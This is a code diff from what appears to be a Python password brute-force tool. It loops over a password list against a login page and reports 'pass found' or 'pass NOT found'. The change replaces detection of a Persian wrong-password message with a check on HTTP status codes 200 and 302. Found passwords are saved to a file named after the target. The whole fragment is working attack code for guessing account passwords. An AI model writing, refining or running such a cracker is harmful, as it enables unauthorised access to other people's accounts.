@@ -171,12 +171,12 @@ for __PASS__ in pas:
 
     ___CHECK_AUTHENTICATION___ = ("کلمه عبور را اشتباه وارد کرده اید")
     # -------------------------------------------------
-    if ___CHECK_AUTHENTICATION___ in _data_:
+    if _REQS_.status_code == 200:
         
         print(Fore.WHITE+'['+Fore.RED+'*'+Fore.WHITE+'] pass NOT found '+Fore.RED+''+__PASS__+'\n')
 
 
-    if ___CHECK_AUTHENTICATION___ not in _data_:
+    if _REQS_.status_code == 302:
         print('')
         print(Fore.WHITE+'['+Fore.GREEN+'*'+Fore.WHITE+'] pass found '+Fore.CYAN+'>_< '+Fore.GREEN+''+__PASS__)
         tr = tar+'.txt'
